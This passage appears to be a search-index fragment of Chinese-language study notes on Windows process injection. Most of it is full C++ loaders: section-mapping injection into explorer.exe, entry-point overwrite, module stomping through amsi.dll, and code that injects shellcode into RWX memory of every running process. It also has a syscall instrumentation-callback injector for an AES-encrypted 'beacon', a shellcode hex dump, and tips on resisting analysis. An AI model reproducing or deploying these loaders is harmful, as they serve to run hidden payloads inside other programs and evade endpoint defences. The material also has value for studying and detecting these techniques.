BOOLEAN CreateSuspended, IN ULONG StackZeroBits, IN OUT PULONG StackReserved, IN OUT PULONG StackCommit, IN PVOID StartAddress, IN PVOID StartParameter OPTIONAL, OUT PHANDLE ThreadHandle, OUT PCLIENT_ID ClientID); DWORD GetProcessIdByName(const wchar_t* processName) { DWORD pid = 0; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); if (snapshot != INVALID_HANDLE_VALUE) { PROCESSENTRY32W processEntry; processEntry.dwSize = sizeof(PROCESSENTRY32W); if (Process32FirstW(snapshot, &processEntry)) { do { if (_wcsicmp(processEntry.szExeFile, processName) == 0) { pid = processEntry.th32ProcessID; break; } } while (Process32NextW(snapshot, &processEntry)); } CloseHandle(snapshot); } return pid; } int main() { unsigned char buf[] = \"\\xfc\"; myNtCreateSection fNtCreateSection = (myNtCreateSection)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtCreateSection\")); myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"NtMapViewOfSection\")); myRtlCreateUserThread fRtlCreateUserThread = (myRtlCreateUserThread)(GetProcAddress(GetModuleHandleA(\"ntdll\"), \"RtlCreateUserThread\")); SIZE_T size = 4096; LARGE_INTEGER sectionSize = { size }; HANDLE sectionHandle = NULL; PVOID localSectionAddress = NULL, remoteSectionAddress = NULL; const wchar_t* processName = L\"explorer.exe\"; DWORD targetPID = GetProcessIdByName(processName); // create a memory section fNtCreateSection(&sectionHandle, SECTION_MAP_READ | SECTION_MAP_WRITE | SECTION_MAP_EXECUTE, NULL, (PLARGE_INTEGER)&sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL); // create a view of the memory section in the local process fNtMapViewOfSection(sectionHandle, GetCurrentProcess(), &localSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_READWRITE); // create a view of the memory section in the target process HANDLE targetHandle = OpenProcess(PROCESS_ALL_ACCESS, false, targetPID); fNtMapViewOfSection(sectionHandle, targetHandle, &remoteSectionAddress, NULL, NULL, NULL, &size, 2, NULL, PAGE_EXECUTE_READ); // copy shellcode to the local view, which will get reflected in the target process's mapped view memcpy(localSectionAddress, buf, sizeof(buf)); HANDLE targetThreadHandle = NULL; fRtlCreateUserThread(targetHandle, NULL, FALSE, 0, 0, 0, remoteSectionAddress, NULL, &targetThreadHandle, NULL); return 0; }","title":"NtCreateSection + NtMapViewOfSection\u6ce8\u5165"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#addressofentrypoint-code-injection-without-virtualallocex-rwx","text":"\u672a\u6d4b\u8bd5\u6210\u529f #include <iostream> #include <windows.h> #include <winternl.h> #pragma comment(lib, \"ntdll\") int main() { unsigned char shellcode[] = \"\\xfc\"; STARTUPINFOA si; si = {}; PROCESS_INFORMATION pi = {}; PROCESS_BASIC_INFORMATION pbi = {}; DWORD returnLength = 0; CreateProcessA(0, (LPSTR)\"c:\\\\windows\\\\system32\\\\notepad.exe\", 0, 0, 0, CREATE_SUSPENDED, 0, 0, &si, &pi); // get target image PEB address and pointer to image base NtQueryInformationProcess(pi.hProcess, ProcessBasicInformation, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &returnLength); DWORD pebOffset = (DWORD)pbi.PebBaseAddress + 8; // get target process image base address LPVOID imageBase = 0; ReadProcessMemory(pi.hProcess, (LPCVOID)pebOffset, &imageBase, 4, NULL); // read target process image headers BYTE headersBuffer[4096] = {}; ReadProcessMemory(pi.hProcess, (LPCVOID)imageBase, headersBuffer, 4096, NULL); // get AddressOfEntryPoint PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)headersBuffer; PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)headersBuffer + dosHeader->e_lfanew); LPVOID codeEntry = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD)imageBase); // write shellcode to image entry point and execute it WriteProcessMemory(pi.hProcess, codeEntry, shellcode, sizeof(shellcode), NULL); ResumeThread(pi.hThread); return 0; }","title":"AddressOfEntryPoint Code Injection without VirtualAllocEx RWX"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#modulestomping","text":"\u6d41\u7a0b\uff1a 1.\u8d77\u4e00\u4e2a\u8fdb\u7a0b\uff0c\u83b7\u53d6\u53e5\u67c4 2.\u5206\u914d\u865a\u62df\u5185\u5b58\uff0c\u5c06\u6b63\u5e38dll\u6ce8\u5165\u5230\u8fdb\u7a0b\u4e2d 3.\u5728dll\u4e2d\u8d77\u4e00\u4e2a\u65b0\u7ebf\u7a0b\uff0c\u5c06shellcode\u6ce8\u5165\u5230\u65b0\u7ebf\u7a0b\u4e2d #include <iostream> #include <Windows.h> #include <psapi.h> int main(int argc, char* argv[]) { PVOID remoteBuffer; wchar_t moduleToInject[] = L\"C:\\\\windows\\\\system32\\\\amsi.dll\"; HMODULE modules[256] = {}; SIZE_T modulesSize = sizeof(modules); DWORD modulesSizeNeeded = 0; DWORD moduleNameSize = 0; SIZE_T modulesCount = 0; CHAR remoteModuleName[128] = {}; HMODULE remoteModule = NULL; unsigned char shellcode[] = \"\\xfc\"; // inject a benign DLL into remote process //HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); //processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, 8444); // \u521b\u5efa\u8fdb\u7a0b\u7684\u53c2\u6570 STARTUPINFOA si; PROCESS_INFORMATION pi; //// \u521d\u59cb\u5316STARTUPINFOA\u7ed3\u6784 ZeroMemory(&si, sizeof(STARTUPINFOA)); si.cb = sizeof(STARTUPINFOA); si.dwFlags = STARTF_USESHOWWINDOW; si.wShowWindow = SW_HIDE; // \u8bbe\u7f6e\u7a97\u53e3\u4e0d\u53ef\u89c1 CreateProcessA(NULL, (LPSTR)\"C:\\\\Windows\\\\System32\\\\notepad.exe\", NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi); //\u8d77\u4e00\u4e2a\u6302\u8d77\u72b6\u6001\u7684notepad\u8fdb\u7a0b HANDLE processHandle = pi.hProcess; //\u83b7\u53d6notepad\u8fdb\u7a0b\u7684\u8fdb\u7a0b\u53e5\u67c4 HANDLE threadHandle = pi.hThread; //\u83b7\u53d6notepad\u8fdb\u7a0b\u7684\u7ebf\u7a0b\u53e5\u67c4 remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof moduleToInject, MEM_COMMIT, PAGE_READWRITE); WriteProcessMemory(processHandle, remoteBuffer, (LPVOID)moduleToInject, sizeof moduleToInject, NULL); PTHREAD_START_ROUTINE threadRoutine = (PTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(TEXT(\"Kernel32\")), \"LoadLibraryW\"); HANDLE dllThread = CreateRemoteThread(processHandle, NULL, 0, threadRoutine, remoteBuffer, 0, NULL); WaitForSingleObject(dllThread, 1000); // find base address of the injected benign DLL in remote process EnumProcessModules(processHandle, modules, modulesSize, &modulesSizeNeeded); modulesCount = modulesSizeNeeded / sizeof(HMODULE); for (size_t i = 0; i < modulesCount; i++) { remoteModule = modules[i]; GetModuleBaseNameA(processHandle, remoteModule, remoteModuleName, sizeof(remoteModuleName)); if (std::string(remoteModuleName).compare(\"amsi.dll\") == 0) { std::cout << remoteModuleName << \" at \" << modules[i]; break; } } // get DLL's AddressOfEntryPoint DWORD headerBufferSize = 0x1000; LPVOID targetProcessHeaderBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, headerBufferSize); ReadProcessMemory(processHandle, remoteModule, targetProcessHeaderBuffer, headerBufferSize, NULL); PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)targetProcessHeaderBuffer; PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)targetProcessHeaderBuffer + dosHeader->e_lfanew); LPVOID dllEntryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (DWORD_PTR)remoteModule); std::cout << \", entryPoint at \" << dllEntryPoint; // write shellcode to DLL's AddressofEntryPoint WriteProcessMemory(processHandle, dllEntryPoint, (LPCVOID)shellcode, sizeof(shellcode), NULL); // execute shellcode from inside the benign DLL CreateRemoteThread(processHandle, NULL, 0, (PTHREAD_START_ROUTINE)dllEntryPoint, NULL, 0, NULL); return 0; }","title":"ModuleStomping"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#enumerating-rwx-protected-memory","text":"\u679a\u4e3e\u5f53\u524d\u8fdb\u7a0b\u7684RWX\u5185\u5b58\u5e76\u8fdc\u7a0b\u6ce8\u5165\uff0c\u4f1a\u628a\u6bcf\u4e2a\u8fdb\u7a0b\u90fd\u5c1d\u8bd5\u53bb\u6ce8\u4e00\u904d\u3002 \u50cf\u75c5\u6bd2\u4e00\u6837\u3002 #include <iostream> #include <Windows.h> #include <TlHelp32.h> int main() { MEMORY_BASIC_INFORMATION mbi = {}; LPVOID offset = 0; HANDLE process = NULL; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0); PROCESSENTRY32 processEntry = {}; processEntry.dwSize = sizeof(PROCESSENTRY32); DWORD bytesWritten = 0; unsigned char shellcode[] = \"\\xff\"; Process32First(snapshot, &processEntry); while (Process32Next(snapshot, &processEntry)) { process = OpenProcess(MAXIMUM_ALLOWED, false, processEntry.th32ProcessID); if (process) { std::wcout << processEntry.szExeFile << \"\\n\"; while (VirtualQueryEx(process, offset, &mbi, sizeof(mbi))) { offset = (LPVOID)((DWORD_PTR)mbi.BaseAddress + mbi.RegionSize); if (mbi.AllocationProtect == PAGE_EXECUTE_READWRITE && mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE) { std::cout << \"\\tRWX: 0x\" << std::hex << mbi.BaseAddress << \"\\n\"; WriteProcessMemory(process, mbi.BaseAddress, shellcode, sizeof(shellcode), NULL); CreateRemoteThread(process, NULL, NULL, (LPTHREAD_START_ROUTINE)mbi.BaseAddress, NULL, NULL, NULL); } } offset = 0; } CloseHandle(process); } return 0; }","title":"Enumerating RWX Protected Memory"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#functionstomping","text":"\u4e0eModuleStomping\u7c7b\u4f3c\uff0c\u4f46\u53c8\u6709\u4e0d\u540c\u3002 1.\u83b7\u53d6\u4e00\u4e2a\u8fdc\u7a0b\u8fdb\u7a0b\u7684\u53e5\u67c4 2.\u5728\u8fdc\u7a0b\u7ebf\u7a0b\u679a\u4e3e\u51fa\u7528\u6237\u5c42Kernel32.dll\u7684\u51fd\u6570\u7684\u57fa\u5740\uff08\u8fd9\u91cc\u4f7f\u7528\u7684\u662fCreateFileW\uff09 3.\u66f4\u6539\u5185\u5b58\u7a7a\u95f4\u4e3aRWX 4.\u5f80\u51fd\u6570\u57fa\u5740\u4e2d\u5199\u5165shellcode 5.\u66f4\u6539\u5185\u5b58\u7a7a\u95f4\u4e3aRCX","title":"FunctionStomping"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#theardlessinjection","text":"https://github.com/CCob/ThreadlessInject hook\u8fdc\u7a0b\u8fdb\u7a0b\u4e2d\u7684\u6307\u5b9a\u51fd\u6570\uff0c\u5f53\u8fdb\u7a0b\u6267\u884c\u6307\u5b9a\u51fd\u6570\u7684\u65f6\u6267\u884c\u4ee3\u7801","title":"TheardlessInjection"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#entry-point-injection","text":"https://github.com/Kudaes/EPI \u4fee\u6539\u76ee\u6807\u8fdb\u7a0b\u7684PEB\u4fe1\u606f\uff0cPEB\u4e2d\u5b58\u50a8\u4e86dllmain\u4fe1\u606f\uff0c\u66f4\u6539dllmain\u7684\u5730\u5740\u4e3ashellcode\u3002\u5f53\u76ee\u6807\u8fdb\u7a0b\u542f\u52a8\u6216\u7ed3\u675f\u4e00\u4e2a\u7ebf\u7a0b\u65f6\uff0c\u4f1a\u91cd\u65b0\u8c03\u7528dllmain\uff0c\u6b64\u65f6\u4f1a\u6267\u884cshellcode","title":"Entry Point Injection"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#mockingjay","text":"\u5229\u7528\u767dDLL\u6587\u4ef6\u7684RWX\u7a7a\u95f4\u6ce8\u5165 \u8be6\u89c10MFIle-dll\u9879\u76ee","title":"MockingJay"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#dllnotificationinjection20238","text":"https://learn.microsoft.com/en-us/windows/win32/devnotes/ldrregisterdllnotification https://github.com/ShorSec/DllNotificationInjection https://shorsec.io/blog/dll-notification-injection/ \u5728\u8fdc\u7a0b\u8fdb\u7a0b\u4e2d\u4fee\u6539 PLDR_DLL_NOTIFICATION_ENTRY \u6210\u5458\uff0c\u5e76\u4f7f Cookie \u6307\u5411shellcode\u7684\u5730\u5740\u3002\u5f53\u8fdc\u7a0b\u8fdb\u7a0b\u52a0\u8f7ddll\u4e4b\u524d\u4f1a\u89e6\u53d1\u4e00\u4e2a\u901a\u77e5 LdrRegisterDllNotification \uff0c\u4ece\u800c\u89e6\u53d1shellcode","title":"DllNotificationInjection(2023/8)"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#ntsetinformationprocess2023-10","text":"https://github.com/OtterHacker/SetProcessInjection \u8be5\u65b9\u5f0f\u4f7f\u7528Nirvana\u8c03\u8bd5\u6280\u672f\uff0c\u5728\u8fdc\u7a0b\u8fdb\u7a0b\u8bbe\u7f6e\u4e86\u4e00\u4e2ahook\uff0c\u5728hook\u8bbe\u7f6e\u6076\u610f\u4ee3\u7801\u3002\u5f53\u7cfb\u7edf\u6bcf\u6b21\u6267\u884csyscall\u540e\u4f1a\u7acb\u5373\u8c03\u7528hook\u3002 \u8fd9\u79cd\u65b9\u5f0f\u9700\u8981 SE_DEBUG_PRIVILEGE \u6743\u9650\u3002 \u7531\u4e8e\u9700\u8981\u9ad8\u6743\u9650\uff0c\u8fd9\u79cd\u65b9\u5f0f\u4e0d\u9002\u5408\u4f5c\u4e3a\u521d\u59cb\u8bbf\u95ee\u4f7f\u7528\u3002 #include \"helpers.h\" #include <TlHelp32.h> #include \"sc.h\" //\u5b9a\u4e49\u5404\u79cd #define DEBUG(x, ...) printf(x, ##__VA_ARGS__) #define ProcessInstrumentationCallback 40 #define SE_DEBUG_PRIVILEGE 0x100000 #define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0) extern VOID InstrumentationHook(VOID); //\u5b9a\u4e49SetInformationProcess\u7ed3\u6784\u4f53 typedef struct _PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION { ULONG Version; ULONG Reserved; PVOID Callback; } PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION, * PPROCESS_INSTRUMENTATION_CALLBACK_INFORMATION; typedef NTSTATUS(NTAPI* pRtlAdjustPrivilege)( DWORD Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, DWORD* OldStatus ); typedef NTSTATUS(NTAPI* pNtSetInformationProcess)( _In_ HANDLE hProcess, _In_ PROCESS_INFORMATION_CLASS ProcessInformationClass, _In_reads_bytes_(ProcessInformationSize) LPVOID ProcessInformation, _In_ DWORD ProcessInformationSize ); //\u6839\u636e\u8fdb\u7a0b\u540d\u83b7\u53d6\u8fdb\u7a0b\u53e5\u67c4\uff0c\u8fd9\u91cc\u662f\u8981\u6ce8\u5165\u7684\u8fdb\u7a0b HANDLE getProcHandlebyName(LPSTR procName, DWORD* PID) { PROCESSENTRY32 entry; entry.dwSize = sizeof(PROCESSENTRY32); NTSTATUS status = NULL; HANDLE hProc = 0; HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL); if (!snapshot) { DEBUG(\"[x] Cannot retrieve the processes snapshot\\n\"); return NULL; } if (Process32First(snapshot, &entry)) { do { if (strcmp((entry.szExeFile), procName) == 0) { *PID = entry.th32ProcessID; DEBUG(\"[+] Injecting into : %d\\n\", *PID); hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, *PID); if (!hProc) { continue; } return hProc; } } while (Process32Next(snapshot, &entry)); } return NULL; } int main(void) { ULONG imageSize = 0; HMODULE hNtdll = GetModuleHandle(\"ntdll.dll\", &imageSize); //\u76f4\u63a5\u4f7f\u7528GetModuleHandle()\u83b7\u53d6ntdll\u53e5\u67c4\uff0c\u53ef\u4ee5\u8fdb\u4e00\u6b65\u4f18\u5316 if (!hNtdll) { DEBUG(\"[x] Cannot load NTDLL.DLL\\n\"); return; } DWORD PID = 0; HANDLE hProc = getProcHandlebyName(\"notepad.exe\", &PID); //\u6839\u636e\u8fdb\u7a0b\u540d\u83b7\u53d6\u8fdb\u7a0b\u53e5\u67c4 if (!hProc) { DEBUG(\"[x] Cannot open the process\\n\"); return; } //\u4e00\u7cfb\u5217\u64cd\u4f5c\uff0c\u627e\u5230NtSetInformationProcess\u548cRtlAdjustPrivilege\u5730\u5740 DEBUG(\"[+] Starting hook deployment !\\n\"); PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION InstrumentationCallbackInfo; pNtSetInformationProcess NtSetInformationProcess = GetProcAddress(hNtdll, \"NtSetInformationProcess\"); pRtlAdjustPrivilege RtlAdjustPrivilege = GetProcAddress(hNtdll, \"RtlAdjustPrivilege\"); //\u8fd9\u4e2a\u51fd\u6570\u662f\u901a\u8fc7sc.h\u6765\u83b7\u53d6shellcode buildsc(); size_t szOutput = 0; DWORD size = 0; unsigned char* file_enc = NULL; BYTE* beaconContent = NULL; size_t beaconSize = NULL; file_enc = base64_decode(sc, sc_length, &szOutput); //\u5148\u5bf9shellcode base64\u89e3\u7801 for (int i = 0; i < sc_length; i++) { printf(\"0x%x,\", file_enc[i]); } printf(\"\\n\"); if (szOutput == 0) { DEBUG(\"[x] Base64 decode failed \\n\"); return -1; } //\u4f7f\u7528key\u6765AES\u89e3\u5bc6 beaconSize = szOutput - 16; beaconContent = (unsigned char*)calloc(beaconSize, sizeof(BYTE)); BOOL decryptStatus = aes_decrypt(key, (sizeof(key) / sizeof(key[0])) - 1, file_enc, beaconSize, beaconContent); if (!decryptStatus || beaconContent == NULL) { DEBUG(\"[x] AES decryption failed\\n\"); return -1; } for (int i = 0; i < beaconSize; i++) { printf(\"0x%x,\", beaconContent[i]); } printf(\"\\n\"); //\u5728\u76ee\u6807\u8fdb\u7a0b\u5206\u914d\u5185\u5b58\u7a7a\u95f4 LPVOID beaconAddress = VirtualAllocEx(hProc, NULL, beaconSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (!beaconAddress) { DEBUG(\"[x] Cannot allocate beacon space : %d\\n\", GetLastError()); return; } DEBUG(\"[+] Beacon memory at : %p\\n\", beaconAddress); //\u81ea\u5b9a\u4e49\u6c47\u7f16\uff0c\u4f7fhook\u4e0d\u8981\u65e0\u9650\u5faa\u73af SIZE_T shellcodeSize = 49; BYTE shellcodeTemplate[49] = { 0x55, 0x48, 0x89, 0xe5, 0x48, 0xc7, 0x05, 0xf1, 0xff, 0xff, 0xff, 0x41, 0xff, 0xe2, 0x00, 0x50, 0x53, 0x51, 0x41, 0x51, 0x41, 0x52, 0x41, 0x53, 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xd0, 0x41, 0x5b, 0x41, 0x5a, 0x41, 0x59, 0x59, 0x5b, 0x58, 0x5d, 0x41, 0xff, 0xe2 }; //push rbp //mov rbp, rsp //; This will modify the instruction push RBP into JMPR10 //mov qword ptr[rip \u2013 15] 0xE2FF41 //push rax //push rbx //push rcx //push r9 //push rl0 //push rll //movabs rax, ${ CSAddr } //call rax //pop r11 //pop r10 //pop r9 //pop rcx //pop rbx //pop rax //pop rbp //jmp r10 BYTE shellcodeContent[49]; CopyMemory(shellcodeContent, shellcodeTemplate, shellcodeSize * sizeof(BYTE)); CopyMemory(shellcodeContent + 26, &beaconAddress, sizeof(DWORD64)); //\u4e3a\u6c47\u7f16\u7801\u5206\u914d\u5185\u5b58\u7a7a\u95f4 LPVOID shellcodeAddress = VirtualAllocEx(hProc, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE); if (!shellcodeAddress) { DEBUG(\"[x] Cannot allocate shellcode space : %d\\n\", GetLastError()); return; } DEBUG(\"[+] Shellcode memory at : %p\\n\", shellcodeAddress); //shellcode\u5199\u5165\u5185\u5b58 BOOL status = WriteProcessMemory(hProc, beaconAddress, beaconContent, beaconSize, NULL); if (!status) { DEBUG(\"[x] Cannot write beacon content at %p : %d\\n\", beaconAddress, GetLastError()); return; } DEBUG(\"[+] Beacon content written at %p\\n\", beaconAddress); //\u6c47\u7f16\u7801\u5199\u5165\u5185\u5b58 status = WriteProcessMemory(hProc, shellcodeAddress, shellcodeContent, shellcodeSize, NULL); if (!status) { DEBUG(\"[x] Cannot write shellcode content at %p : %d\\n\", shellcodeAddress, GetLastError()); return; } DEBUG(\"[+] Shellcode content written at %p\\n\", shellcodeAddress); //\u4fee\u6539\u5185\u5b58\u5c5e\u6027 DWORD oldProtect = 0; status = VirtualProtectEx(hProc, beaconAddress, beaconSize, PAGE_EXECUTE_READ, &oldProtect); if (!status) { DEBUG(\"[x] Failed to reprotect beacon memory at %p : %d\\n\", beaconAddress, GetLastError()); } DEBUG(\"[+] Beacon memory reprotected !\\n\"); status = VirtualProtectEx(hProc, shellcodeAddress, shellcodeSize, PAGE_EXECUTE_READWRITE, &oldProtect); if (!status) { DEBUG(\"[x] Failed to reprotect beacon memory at %p : %d\\n\", shellcodeAddress, GetLastError()); } DEBUG(\"[+] Beacon shellcode reprotected !\\n\"); //\u8bbe\u7f6ehook InstrumentationCallbackInfo.Version = 0; InstrumentationCallbackInfo.Reserved = 0; InstrumentationCallbackInfo.Callback = shellcodeAddress; NTSTATUS ntStatus = NtSetInformationProcess( hProc, ProcessInstrumentationCallback, &InstrumentationCallbackInfo, sizeof(InstrumentationCallbackInfo) ); if (!NT_SUCCESS(ntStatus)) { DEBUG(\"[x] Failed to deploy hook : %p \\n\", ntStatus); return; } DEBUG(\"[+] Hook deployed successfully !\\n\"); BOOL hookCalled; do { DEBUG(\"[-] Waiting 5 seconds for the hook to be called...\\n\"); Sleep(5000); BYTE content[1]; SIZE_T bytesRead; status = ReadProcessMemory(hProc, shellcodeAddress, &content, 1 * sizeof(BYTE), &bytesRead); if (!status) { DEBUG(\"\\t[x] Cannot read process memory : %d\\n\", GetLastError()); return; } DEBUG(\"\\t[-] Value read: %2x\\n\", content[0]); hookCalled = content == shellcodeContent[0]; } while (hookCalled); DEBUG(\"[+] Your payload must be executed now !\\n\"); }","title":"NtSetInformationProcess(2023-10)"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#_5","text":"\u867d\u7136\u7a0b\u5e8f\u5b9e\u73b0\u4e86\u81ea\u5b9a\u4e49AES\u52a0\u5bc6\uff0c\u4f46\u662f\u5728\u52a8\u6001\u8c03\u8bd5\u4e2d\u4f9d\u65e7\u5f88\u5bb9\u6613\u88ab\u6293\u5230\u539f\u59cbshellcode\u3002 \u5bfc\u5165\u51fd\u6570\u90fd\u662f\u6b63\u5e38\u8c03\u7528\u7684\uff0c\u8fd9\u4e9b\u51fd\u6570\u5728\u5bfc\u5165\u8868\u4e2d\u4e00\u76ee\u4e86\u7136\u3002 \u76f4\u63a5\u67e5\u627e WriteProcessMemory \u7684\u51fd\u6570\u5f15\u7528\u6253\u4e0b\u65ad\u70b9\u3002 windows\u4e0a64\u4f4d\u7684\u7a0b\u5e8f\u8c03\u7528\u7ea6\u5b9a\u662ffastcall\uff0c\u5728\u5c06\u8981\u4f20\u5165 WriteProcessMemory \u51fd\u6570\u7684\u7b2c\u4e09\u4e2a\u53c2\u6570\u548c\u7b2c\u56db\u4e2a\u53c2\u6570r8\u548cr9\u53ef\u4ee5\u627e\u5230shellcode\u7684\u5185\u5b58\u5730\u5740\u548c\u5927\u5c0f\u3002 WriteProcessMemory( _In_ HANDLE hProcess, _In_ LPVOID lpBaseAddress, _In_reads_bytes_(nSize) LPCVOID lpBuffer, _In_ SIZE_T nSize, _Out_opt_ SIZE_T* lpNumberOfBytesWritten ); 0000026B71178E20 FC E8 82 00 00 00 60 89 E5 31 C0 64 8B 50 30 8B \u00fc\u00e8....`.\u00e51\u00c0d.P0. 0000026B71178E30 52 0C 8B 52 14 8B 72 28 0F B7 4A 26 31 FF AC 3C R..R..r(.\u00b7J&1\u00ff\u00ac< 0000026B71178E40 61 7C 02 2C 20 C1 CF 0D 01 C7 E2 F2 52 57 8B 52 a|., \u00c1\u00cf..\u00c7\u00e2\u00f2RW.R 0000026B71178E50 10 8B 4A 3C 8B 4C 11 78 E3 48 01 D1 51 8B 59 20 ..J<.L.x\u00e3H.\u00d1Q.Y 0000026B71178E60 01 D3 8B 49 18 E3 3A 49 8B 34 8B 01 D6 31 FF AC .\u00d3.I.\u00e3:I.4..\u00d61\u00ff\u00ac 0000026B71178E70 C1 CF 0D 01 C7 38 E0 75 F6 03 7D F8 3B 7D 24 75 \u00c1\u00cf..\u00c78\u00e0u\u00f6.}\u00f8;}$u 0000026B71178E80 E4 58 8B 58 24 01 D3 66 8B 0C 4B 8B 58 1C 01 D3 \u00e4X.X$.\u00d3f..K.X..\u00d3 0000026B71178E90 8B 04 8B 01 D0 89 44 24 24 5B 5B 61 59 5A 51 FF ....\u00d0.D$$[[aYZQ\u00ff 0000026B71178EA0 E0 5F 5F 5A 8B 12 EB 8D 5D 6A 01 8D 85 B2 00 00 \u00e0__Z..\u00eb.]j...\u00b2.. 0000026B71178EB0 00 50 68 31 8B 6F 87 FF D5 BB F0 B5 A2 56 68 A6 .Ph1.o.\u00ff\u00d5\u00bb\u00f0\u00b5\u00a2Vh\u00a6 0000026B71178EC0 95 BD 9D FF D5 3C 06 7C 0A 80 FB E0 75 05 BB 47 .\u00bd.\u00ff\u00d5<.|..\u00fb\u00e0u.\u00bbG 0000026B71178ED0 13 72 6F 6A 00 53 FF D5 63 61 6C 63 2E 65 78 65 .roj.S\u00ff\u00d5calc.exe 0000026B71178EE0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ \u8fd9\u548c\u672a\u52a0\u5bc6\u524d\u7684shellcode\u662f\u4e00\u6837\u7684 \u6240\u4ee5\u60f3\u8981\u9632\u6b62\u88ab\u5206\u6790\uff0c\u8fd8\u9700\u8981\u7ed3\u5408\u5176\u4ed6\u6280\u672f\u5982apihash\u4f7f\u7528\u3002\u867d\u7136\u4e0d\u80fd\u5b8c\u5168\u963b\u6b62\u88ab\u5206\u6790\uff0c\u4f46\u80fd\u5927\u5927\u589e\u5927\u5206\u6790\u96be\u5ea6\u3002","title":"\u7b80\u5355\u5206\u6790"},{"location":"Windows%E7%9B%B8%E5%85%B3/%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/#poolparty2023-12","text":"https://github.com/SafeBreach-Labs/PoolParty \u8be5\u6ce8\u5165\u6280\u672f\u89e3\u51b3\u4e86 CreateRemoteThread() \u7684\u95ee\u9898\u3002 \u8be5\u6280\u672f\u5229\u7528 \u7528\u6237\u6a21\u5f0f \u4e0bWindows\u7ebf\u7a0b\u6c60\u53ef\u4fe1\u7a0b\u5e8f\u6765\u89e3\u51b3\u6b64\u95ee\u9898\u3002 \u7ebf\u7a0b\u6c60\u5305\u62ec - \u5de5\u4f5c\u7ebf\u7a0b - \u7b49\u5f85\u7ebf\u7a0b - \u5de5\u4f5c\u961f\u5217 - \u5de5\u4f5c\u5668\u5de5\u5382 - \u9ed8\u8ba4\u7ebf\u7a0b\u6c60 1\u3001\u5229\u7528\u5de5\u4f5c\u5668\u5de5\u5382 \u5de5\u4f5c\u5668\u5de5\u5382\u662f\u4e00\u4e2aWindows\u5bf9\u8c61\uff0c\u8d1f\u8d23\u7ba1\u7406\u7ebf\u7a0b\u6c60\u5de5\u4f5c\u7ebf\u7a0b\u3002\u5b83\u901a\u8fc7\u76d1\u89c6\u6d3b\u52a8\u6216\u963b\u585e\u6765\u7ba1\u7406\u5de5\u4f5c\u7ebf\u7a0b\uff0c\u5e76\u6839\u636e\u76d1\u89c6\u7ed3\u679c\u521b\u5efa\u6216\u7ec8\u6b62\u5de5\u4f5c\u7ebf\u7a0b\u3002 \u5de5\u4f5c\u5668\u5de5\u5382\u4e0d\u6267\u884c\u4efb\u4f55\u5de5\u4f5c\u9879\u7684\u8c03\u5ea6\u6216\u6267\u884c\uff1b \u5b83\u7684\u4f5c\u7528\u662f\u786e\u4fdd\u5de5\u4f5c\u7ebf\u7a0b\u7684\u6570\u91cf\u8db3\u591f\u3002 